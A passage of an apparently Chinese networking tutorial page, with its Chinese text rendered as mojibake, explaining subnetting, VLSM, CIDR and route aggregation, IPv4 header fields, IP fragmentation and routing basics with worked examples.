class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">é—®é¢˜ï¼š<br>ä¸€ä¸ªCç±»ç½‘ç»œï¼ˆ192.168.1.0/24ï¼‰<br>å¯ä»¥å®¹çº³254å°ä¸»æœº<br>ä½†å¯èƒ½æœ‰ä»¥ä¸‹éœ€æ±‚ï¼š<br><span class="hljs-bullet">- </span>å°†ç½‘ç»œåˆ†æˆå¤šä¸ªéƒ¨é—¨<br><span class="hljs-bullet">- </span>æé«˜å®‰å…¨æ€§<br><span class="hljs-bullet">- </span>å‡å°‘å¹¿æ’­åŸŸ<br><br>è§£å†³æ–¹æ¡ˆï¼š<br>å­ç½‘åˆ’åˆ†ï¼ˆSubnettingï¼‰<br></code></pre></td></tr></table></figure><p><strong>å­ç½‘åˆ’åˆ†ç¤ºä¾‹</strong>ï¼š</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs dns">åŸç½‘ç»œï¼š<br><span class="hljs-number">192.168.1.0</span>/<span class="hljs-number">24</span><br>å­ç½‘æ©ç ï¼š<span class="hljs-number">255.255.255.0</span><br>ä¸»æœºæ•°ï¼š<span class="hljs-number">254</span><br><br>éœ€æ±‚ï¼š<br>åˆ’åˆ†ä¸º<span class="hljs-number">4</span>ä¸ªå­ç½‘<br>æ¯ä¸ªå­ç½‘è‡³å°‘<span class="hljs-number">60</span>å°ä¸»æœº<br><br>è®¡ç®—ï¼š<br><span class="hljs-number">1</span>. ç¡®å®šå­ç½‘æ•°é‡ï¼š<span class="hljs-number">4</span>ä¸ªå­ç½‘ â†’ éœ€è¦<span class="hljs-number">2</span>ä½ï¼ˆ<span class="hljs-number">2</span>^<span class="hljs-number">2</span> = <span class="hljs-number">4</span>ï¼‰<br><span class="hljs-number">2</span>. æ–°çš„å‰ç¼€é•¿åº¦ï¼š<span class="hljs-number">24</span> + <span class="hljs-number">2</span> = <span class="hljs-number">26</span><br><span class="hljs-number">3</span>. æ–°çš„å­ç½‘æ©ç ï¼š<span class="hljs-number">255.255.255.192</span>ï¼ˆ/<span class="hljs-number">26</span>ï¼‰<br><span class="hljs-number">4</span>. æ¯ä¸ªå­ç½‘ä¸»æœºæ•°ï¼š<span class="hljs-number">2</span>^(<span class="hljs-number">32</span>-<span class="hljs-number">26</span>) - <span class="hljs-number">2</span> = <span class="hljs-number">62</span><br><br>å­ç½‘åˆ’åˆ†ç»“æœï¼š<br>å­ç½‘<span class="hljs-number">1ï¼š192.168.1</span>.<span class="hljs-number">0</span>/<span class="hljs-number">26</span>     (<span class="hljs-number">192.168.1.0</span>   ~ <span class="hljs-number">192.168.1.63</span>)<br>       ç½‘ç»œåœ°å€ï¼š<span class="hljs-number">192.168.1.0</span><br>       å¹¿æ’­åœ°å€ï¼š<span class="hljs-number">192.168.1.63</span><br>       å¯ç”¨èŒƒå›´ï¼š<span class="hljs-number">192.168.1.1</span> ~ <span class="hljs-number">192.168.1.62</span><br><br>å­ç½‘<span class="hljs-number">2ï¼š192.168.1</span>.<span class="hljs-number">64</span>/<span class="hljs-number">26</span>    (<span class="hljs-number">192.168.1.64</span>  ~ <span class="hljs-number">192.168.1.127</span>)<br>       ç½‘ç»œåœ°å€ï¼š<span class="hljs-number">192.168.1.64</span><br>       å¹¿æ’­åœ°å€ï¼š<span class="hljs-number">192.168.1.127</span><br>       å¯ç”¨èŒƒå›´ï¼š<span class="hljs-number">192.168.1.65</span> ~ <span class="hljs-number">192.168.1.126</span><br><br>å­ç½‘<span class="hljs-number">3ï¼š192.168.1</span>.<span class="hljs-number">128</span>/<span class="hljs-number">26</span>   (<span class="hljs-number">192.168.1.128</span> ~ <span class="hljs-number">192.168.1.191</span>)<br>       ç½‘ç»œåœ°å€ï¼š<span class="hljs-number">192.168.1.128</span><br>       å¹¿æ’­åœ°å€ï¼š<span class="hljs-number">192.168.1.191</span><br>       å¯ç”¨èŒƒå›´ï¼š<span class="hljs-number">192.168.1.129</span> ~ <span class="hljs-number">192.168.1.190</span><br><br>å­ç½‘<span class="hljs-number">4ï¼š192.168.1</span>.<span class="hljs-number">192</span>/<span class="hljs-number">26</span>   (<span class="hljs-number">192.168.1.192</span> ~ <span class="hljs-number">192.168.1.255</span>)<br>       ç½‘ç»œåœ°å€ï¼š<span class="hljs-number">192.168.1.192</span><br>       å¹¿æ’­åœ°å€ï¼š<span class="hljs-number">192.168.1.255</span><br>       å¯ç”¨èŒƒå›´ï¼š<span class="hljs-number">192.168.1.193</span> ~ <span class="hljs-number">192.168.1.254</span><br></code></pre></td></tr></table></figure><p><strong>VLSMï¼ˆå¯å˜é•¿å­ç½‘æ©ç ï¼‰</strong>ï¼š</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs dns">VLSM = Variable Length Subnet Mask<br><br>å…è®¸ä¸åŒå­ç½‘ä½¿ç”¨ä¸åŒé•¿åº¦çš„å­ç½‘æ©ç <br><br>ç¤ºä¾‹ï¼š<br>å…¬å¸ç½‘ç»œï¼š<span class="hljs-number">192.168.1.0</span>/<span class="hljs-number">24</span><br><br>éœ€æ±‚ï¼š<br>- éƒ¨é—¨<span class="hljs-keyword">A</span>ï¼š<span class="hljs-number">100</span>å°ä¸»æœº<br>- éƒ¨é—¨Bï¼š<span class="hljs-number">50</span>å°ä¸»æœº<br>- éƒ¨é—¨Cï¼š<span class="hljs-number">25</span>å°ä¸»æœº<br>- ç‚¹å¯¹ç‚¹é“¾è·¯ï¼š<span class="hljs-number">2</span>å°è®¾å¤‡ï¼ˆè·¯ç”±å™¨ä¹‹é—´ï¼‰<br><br>åˆ†é…ï¼š<br>éƒ¨é—¨<span class="hljs-keyword">A</span>ï¼š<span class="hljs-number">192.168.1.0</span>/<span class="hljs-number">25</span>     (<span class="hljs-number">128</span>ä¸ªåœ°å€ï¼Œ<span class="hljs-number">126</span>ä¸ªä¸»æœº)<br>éƒ¨é—¨Bï¼š<span class="hljs-number">192.168.1.128</span>/<span class="hljs-number">26</span>   (<span class="hljs-number">64</span>ä¸ªåœ°å€ï¼Œ<span class="hljs-number">62</span>ä¸ªä¸»æœº)<br>éƒ¨é—¨Cï¼š<span class="hljs-number">192.168.1.192</span>/<span class="hljs-number">27</span>   (<span class="hljs-number">32</span>ä¸ªåœ°å€ï¼Œ<span class="hljs-number">30</span>ä¸ªä¸»æœº)<br>é“¾è·¯ï¼š  <span class="hljs-number">192.168.1.224</span>/<span class="hljs-number">30</span>   (<span class="hljs-number">4</span>ä¸ªåœ°å€ï¼Œ<span class="hljs-number">2</span>ä¸ªä¸»æœº)<br><br>ä¼˜ç‚¹ï¼š<br>âœ… çµæ´»åˆ†é…<br>âœ… èŠ‚çœåœ°å€<br>âœ… é«˜æ•ˆåˆ©ç”¨<br></code></pre></td></tr></table></figure><h3 id="2-5-CIDRï¼ˆæ— ç±»åŸŸé—´è·¯ç”±ï¼‰"><a href="#2-5-CIDRï¼ˆæ— ç±»åŸŸé—´è·¯ç”±ï¼‰" class="headerlink" title="2.5 CIDRï¼ˆæ— ç±»åŸŸé—´è·¯ç”±ï¼‰"></a>2.5 CIDRï¼ˆæ— ç±»åŸŸé—´è·¯ç”±ï¼‰</h3><p><strong>ä»€ä¹ˆæ˜¯CIDRï¼Ÿ</strong></p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">CIDR = Classless Inter-Domain Routing<br>æ— ç±»åŸŸé—´è·¯ç”±<br><br>æ›¿ä»£ä¼ ç»Ÿçš„Aã€Bã€Cç±»åœ°å€åˆ†ç±»<br>å…è®¸ä»»æ„é•¿åº¦çš„ç½‘ç»œå‰ç¼€<br><br>è¡¨ç¤ºæ–¹æ³•ï¼š<br>IPåœ°å€/å‰ç¼€é•¿åº¦<br><br>ç¤ºä¾‹ï¼š<br><span class="hljs-number">192.168.1.0</span>/<span class="hljs-number">24</span><br>- <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">0</span> æ˜¯ç½‘ç»œåœ°å€<br>- /<span class="hljs-number">24</span> è¡¨ç¤ºå‰<span class="hljs-number">24</span>ä½æ˜¯ç½‘ç»œéƒ¨åˆ†<br><br>ä¼˜ç‚¹ï¼š<br>âœ… çµæ´»åˆ†é…åœ°å€<br>âœ… å‡å°‘è·¯ç”±è¡¨å¤§å°ï¼ˆè·¯ç”±èšåˆï¼‰<br>âœ… æé«˜åœ°å€åˆ©ç”¨ç‡<br></code></pre></td></tr></table></figure><p><strong>è·¯ç”±èšåˆï¼ˆRoute Aggregationï¼‰</strong>ï¼š</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">é—®é¢˜ï¼š<br>å¤šä¸ªè¿ç»­çš„ç½‘ç»œ<br><br>ç¤ºä¾‹ï¼š<br><span class="hljs-number">192.168.0.0</span>/<span class="hljs-number">24</span><br><span class="hljs-number">192.168.1.0</span>/<span class="hljs-number">24</span><br><span class="hljs-number">192.168.2.0</span>/<span class="hljs-number">24</span><br><span class="hljs-number">192.168.3.0</span>/<span class="hljs-number">24</span><br><br>å¯ä»¥èšåˆä¸ºï¼š<br><span class="hljs-number">192.168.0.0</span>/<span class="hljs-number">22</span><br><br>è®¡ç®—ï¼š<br><span class="hljs-number">192.168.0.0</span>  = <span class="hljs-number">11000000</span>.<span class="hljs-number">10101000</span>.<span class="hljs-number">00000000</span>.<span class="hljs-number">00000000</span><br><span class="hljs-number">192.168.3.0</span>  = <span class="hljs-number">11000000</span>.<span class="hljs-number">10101000</span>.<span class="hljs-number">00000011</span>.<span class="hljs-number">00000000</span><br>å…±åŒå‰ç¼€ï¼š     <span class="hljs-number">11000000</span>.<span class="hljs-number">10101000</span>.<span class="hljs-number">000000</span>ï¼ˆ<span class="hljs-number">22</span>ä½ï¼‰<br><br>ä¼˜ç‚¹ï¼š<br>- è·¯ç”±è¡¨ä»<span class="hljs-number">4</span>æ¡å˜æˆ<span class="hljs-number">1</span>æ¡<br>- å‡å°‘å†…å­˜å ç”¨<br>- åŠ å¿«æŸ¥æ‰¾é€Ÿåº¦<br></code></pre></td></tr></table></figure><hr><h2 id="3-IPæŠ¥æ–‡æ ¼å¼"><a href="#3-IPæŠ¥æ–‡æ ¼å¼" class="headerlink" title="3. IPæŠ¥æ–‡æ ¼å¼"></a>3. IPæŠ¥æ–‡æ ¼å¼</h2><h3 id="3-1-IPv4æŠ¥æ–‡å¤´éƒ¨"><a href="#3-1-IPv4æŠ¥æ–‡å¤´éƒ¨" class="headerlink" title="3.1 IPv4æŠ¥æ–‡å¤´éƒ¨"></a>3.1 IPv4æŠ¥æ–‡å¤´éƒ¨</h3><p><strong>æŠ¥æ–‡ç»“æ„</strong>ï¼š</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">IPv4å¤´éƒ¨ï¼ˆ20-60å­—èŠ‚ï¼‰ï¼š<br><br><span class="hljs-code"> 0                   1                   2                   3</span><br><span class="hljs-section"> 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1</span><br><span class="hljs-section">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="hljs-section">|Version|  IHL  |Type of Service|          Total Length         |</span><br><span class="hljs-section">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="hljs-section">|         Identification        |Flags|      Fragment Offset    |</span><br><span class="hljs-section">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="hljs-section">|  Time to Live |    Protocol   |         Header Checksum       |</span><br><span class="hljs-section">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="hljs-section">|                       Source Address                          |</span><br><span class="hljs-section">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="hljs-section">|                    Destination Address                        |</span><br><span class="hljs-section">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="hljs-section">|                    Options (if any)                           |</span><br><span class="hljs-section">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="hljs-section">|                          Data                                 |</span><br><span class="hljs-section">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></code></pre></td></tr></table></figure><p><strong>å­—æ®µè¯´æ˜</strong>ï¼š</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">Versionï¼ˆç‰ˆæœ¬ï¼Œ4ä½ï¼‰ï¼š<br><span class="hljs-bullet">- </span>IPåè®®ç‰ˆæœ¬<br><span class="hljs-bullet">- </span>IPv4 = 4<br><span class="hljs-bullet">- </span>IPv6 = 6<br><br>IHLï¼ˆå¤´éƒ¨é•¿åº¦ï¼Œ4ä½ï¼‰ï¼š<br><span class="hljs-bullet">- </span>Internet Header Length<br><span class="hljs-bullet">- </span>ä»¥4å­—èŠ‚ä¸ºå•ä½<br><span class="hljs-bullet">- </span>æœ€å°å€¼ï¼š5ï¼ˆ20å­—èŠ‚ï¼‰<br><span class="hljs-bullet">- </span>æœ€å¤§å€¼ï¼š15ï¼ˆ60å­—èŠ‚ï¼‰<br><br>Type of Serviceï¼ˆæœåŠ¡ç±»å‹ï¼Œ8ä½ï¼‰ï¼š<br><span class="hljs-bullet">- </span>ç°åœ¨ç§°ä¸ºDSCPï¼ˆå·®åˆ†æœåŠ¡ä»£ç ç‚¹ï¼‰<br><span class="hljs-bullet">- </span>ç”¨äºQoSï¼ˆæœåŠ¡è´¨é‡ï¼‰<br><span class="hljs-bullet">- </span>ä¼˜å…ˆçº§å’Œå»¶è¿Ÿè¦æ±‚<br><br>Total Lengthï¼ˆæ€»é•¿åº¦ï¼Œ16ä½ï¼‰ï¼š<br><span class="hljs-bullet">- </span>æ•´ä¸ªIPæ•°æ®åŒ…çš„é•¿åº¦ï¼ˆå¤´éƒ¨+æ•°æ®ï¼‰<br><span class="hljs-bullet">- </span>å•ä½ï¼šå­—èŠ‚<br><span class="hljs-bullet">- </span>æœ€å¤§å€¼ï¼š65,535å­—èŠ‚<br><br>Identificationï¼ˆæ ‡è¯†ï¼Œ16ä½ï¼‰ï¼š<br><span class="hljs-bullet">- </span>å”¯ä¸€æ ‡è¯†ä¸€ä¸ªæ•°æ®åŒ…<br><span class="hljs-bullet">- </span>ç”¨äºåˆ†ç‰‡é‡ç»„<br><br>Flagsï¼ˆæ ‡å¿—ï¼Œ3ä½ï¼‰ï¼š<br><span class="hljs-bullet">- </span>Bit 0: ä¿ç•™ï¼Œå¿…é¡»ä¸º0<br><span class="hljs-bullet">- </span>Bit 1: DFï¼ˆDon&#x27;t Fragmentï¼‰- ç¦æ­¢åˆ†ç‰‡<br><span class="hljs-bullet">- </span>Bit 2: MFï¼ˆMore Fragmentsï¼‰- æ›´å¤šåˆ†ç‰‡<br><br>Fragment Offsetï¼ˆç‰‡åç§»ï¼Œ13ä½ï¼‰ï¼š<br><span class="hljs-bullet">- </span>åˆ†ç‰‡åœ¨åŸå§‹æ•°æ®åŒ…ä¸­çš„ä½ç½®<br><span class="hljs-bullet">- </span>ä»¥8å­—èŠ‚ä¸ºå•ä½<br><br>Time to Liveï¼ˆç”Ÿå­˜æ—¶é—´ï¼Œ8ä½ï¼ŒTTLï¼‰ï¼š<br><span class="hljs-bullet">- </span>æ•°æ®åŒ…æœ€å¤§è·³æ•°<br><span class="hljs-bullet">- </span>æ¯ç»è¿‡ä¸€ä¸ªè·¯ç”±å™¨å‡1<br><span class="hljs-bullet">- </span>ä¸º0æ—¶ä¸¢å¼ƒ<br><span class="hljs-bullet">- </span>é˜²æ­¢è·¯ç”±ç¯è·¯<br><br>Protocolï¼ˆåè®®ï¼Œ8ä½ï¼‰ï¼š<br><span class="hljs-bullet">- </span>ä¸Šå±‚åè®®ç±»å‹<br><span class="hljs-bullet">- </span>1 = ICMP<br><span class="hljs-bullet">- </span>6 = TCP<br><span class="hljs-bullet">- </span>17 = UDP<br><br>Header Checksumï¼ˆå¤´éƒ¨æ ¡éªŒå’Œï¼Œ16ä½ï¼‰ï¼š<br><span class="hljs-bullet">- </span>ç”¨äºæ£€æµ‹å¤´éƒ¨é”™è¯¯<br><span class="hljs-bullet">- </span>åªæ ¡éªŒå¤´éƒ¨ï¼Œä¸æ ¡éªŒæ•°æ®<br><br>Source Addressï¼ˆæºåœ°å€ï¼Œ32ä½ï¼‰ï¼š<br><span class="hljs-bullet">- </span>å‘é€æ–¹IPåœ°å€<br><br>Destination Addressï¼ˆç›®çš„åœ°å€ï¼Œ32ä½ï¼‰ï¼š<br><span class="hljs-bullet">- </span>æ¥æ”¶æ–¹IPåœ°å€<br><br>Optionsï¼ˆé€‰é¡¹ï¼Œå¯å˜é•¿åº¦ï¼‰ï¼š<br><span class="hljs-bullet">- </span>å¯é€‰å­—æ®µ<br><span class="hljs-bullet">- </span>ç”¨äºæµ‹è¯•ã€è°ƒè¯•ç­‰<br><span class="hljs-bullet">- </span>å¾ˆå°‘ä½¿ç”¨<br></code></pre></td></tr></table></figure><h3 id="3-2-IPåˆ†ç‰‡"><a href="#3-2-IPåˆ†ç‰‡" class="headerlink" title="3.2 IPåˆ†ç‰‡"></a>3.2 IPåˆ†ç‰‡</h3><p><strong>ä¸ºä»€ä¹ˆéœ€è¦åˆ†ç‰‡ï¼Ÿ</strong></p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">é—®é¢˜ï¼š<br>ä¸åŒç½‘ç»œçš„MTUï¼ˆæœ€å¤§ä¼ è¾“å•å…ƒï¼‰ä¸åŒ<br><br>å¸¸è§MTUï¼š<br><span class="hljs-bullet">- </span>ä»¥å¤ªç½‘ï¼š1500å­—èŠ‚<br><span class="hljs-bullet">- </span>PPPoEï¼š1492å­—èŠ‚<br><span class="hljs-bullet">- </span>VPNï¼šæ›´å°<br><br>å¦‚æœIPæ•°æ®åŒ…å¤§äºMTUï¼š<br>éœ€è¦åˆ†ç‰‡ï¼ˆFragmentationï¼‰<br></code></pre></td></tr></table></figure><p><strong>åˆ†ç‰‡è¿‡ç¨‹</strong>ï¼š</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">åŸå§‹æ•°æ®åŒ…ï¼š<br>æ€»é•¿åº¦ï¼š3000å­—èŠ‚<br>MTUï¼š1500å­—èŠ‚<br><br>åˆ†ç‰‡1ï¼š<br><span class="hljs-bullet">- </span>å¤´éƒ¨ï¼š20å­—èŠ‚<br><span class="hljs-bullet">- </span>æ•°æ®ï¼š1480å­—èŠ‚<br><span class="hljs-bullet">- </span>æ ‡è¯†ï¼š12345<br><span class="hljs-bullet">- </span>MFæ ‡å¿—ï¼š1ï¼ˆè¿˜æœ‰æ›´å¤šåˆ†ç‰‡ï¼‰<br><span class="hljs-bullet">- </span>ç‰‡åç§»ï¼š0<br><br>åˆ†ç‰‡2ï¼š<br><span class="hljs-bullet">- </span>å¤´éƒ¨ï¼š20å­—èŠ‚<br><span class="hljs-bullet">- </span>æ•°æ®ï¼š1480å­—èŠ‚<br><span class="hljs-bullet">- </span>æ ‡è¯†ï¼š12345<br><span class="hljs-bullet">- </span>MFæ ‡å¿—ï¼š1ï¼ˆè¿˜æœ‰æ›´å¤šåˆ†ç‰‡ï¼‰<br><span class="hljs-bullet">- </span>ç‰‡åç§»ï¼š1480/8 = 185<br><br>åˆ†ç‰‡3ï¼š<br><span class="hljs-bullet">- </span>å¤´éƒ¨ï¼š20å­—èŠ‚<br><span class="hljs-bullet">- </span>æ•°æ®ï¼š40å­—èŠ‚ï¼ˆå‰©ä½™ï¼‰<br><span class="hljs-bullet">- </span>æ ‡è¯†ï¼š12345<br><span class="hljs-bullet">- </span>MFæ ‡å¿—ï¼š0ï¼ˆæœ€åä¸€ä¸ªåˆ†ç‰‡ï¼‰<br><span class="hljs-bullet">- </span>ç‰‡åç§»ï¼š2960/8 = 370<br><br>é‡ç»„ï¼š<br>æ¥æ”¶æ–¹æ ¹æ®æ ‡è¯†å’Œç‰‡åç§»é‡ç»„<br></code></pre></td></tr></table></figure><p><strong>åˆ†ç‰‡çš„é—®é¢˜</strong>ï¼š</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs markdown">æ€§èƒ½é—®é¢˜ï¼š<br><span class="hljs-bullet">-</span> å¢åŠ å¤„ç†å¼€é”€<br><span class="hljs-bullet">-</span> ä¸¢å¤±ä¸€ä¸ªåˆ†ç‰‡ï¼Œæ•´ä¸ªæ•°æ®åŒ…éœ€è¦é‡ä¼ <br><span class="hljs-bullet">-</span> è·¯ç”±å™¨éœ€è¦ç¼“å­˜åˆ†ç‰‡<br><br>è§£å†³æ–¹æ¡ˆï¼š<br><span class="hljs-bullet">1.</span> è·¯å¾„MTUå‘ç°ï¼ˆPath MTU Discoveryï¼‰<br><span class="hljs-bullet">   -</span> å‘é€DFæ ‡å¿—çš„æ•°æ®åŒ…<br><span class="hljs-bullet">   -</span> å¦‚æœè¿‡å¤§ï¼Œè·¯ç”±å™¨è¿”å›ICMPé”™è¯¯<br><span class="hljs-bullet">   -</span> å‘é€æ–¹è°ƒæ•´æ•°æ®åŒ…å¤§å°<br><br><span class="hljs-bullet">2.</span> TCP MSSåå•†<br><span class="hljs-bullet">   -</span> åœ¨TCPæ¡æ‰‹æ—¶åå•†æœ€å¤§æ®µå¤§å°<br><span class="hljs-bullet">   -</span> é¿å…IPå±‚åˆ†ç‰‡<br></code></pre></td></tr></table></figure><hr><h2 id="4-IPè·¯ç”±åŸºç¡€"><a href="#4-IPè·¯ç”±åŸºç¡€" class="headerlink" title="4. IPè·¯ç”±åŸºç¡€"></a>4. IPè·¯ç”±åŸºç¡€</h2><h3 id="4-1-è·¯ç”±çš„æ¦‚å¿µ"><a href="#4-1-è·¯ç”±çš„æ¦‚å¿µ" class="headerlink" title="4.1 è·¯ç”±çš„æ¦‚å¿µ"></a>4.1 è·¯ç”±çš„æ¦‚å¿µ</h3><p><strong>ä»€ä¹ˆæ˜¯è·¯ç”±ï¼Ÿ</strong></p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">è·¯ç”±ï¼ˆRoutingï¼‰ï¼š<br>é€‰æ‹©æ•°æ®åŒ…ä¼ è¾“è·¯å¾„çš„è¿‡ç¨‹<br><br>ç”Ÿæ´»ç±»æ¯”ï¼š<br>ä»åŒ—äº¬åˆ°ä¸Šæµ·ï¼š<br><span class="hljs-bullet">- </span>å¯ä»¥åé£æœºï¼ˆç›´è¾¾ï¼‰<br><span class="hljs-bullet">- </span>å¯ä»¥åé«˜é“ï¼ˆä¸­è½¬ï¼‰<br><span class="hljs-bullet">- </span>å¯ä»¥è‡ªé©¾ï¼ˆå¤šæ¡è·¯çº¿ï¼‰<br><br>è·¯ç”±å™¨é€‰æ‹©æœ€ä½³è·¯å¾„<br></code></pre></td></tr></table></figure><p><strong>è·¯ç”±è¡¨</strong>ï¼š</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">è·¯ç”±è¡¨ï¼ˆRouting Tableï¼‰ï¼š<br>å­˜å‚¨è·¯ç”±ä¿¡æ¯çš„è¡¨æ 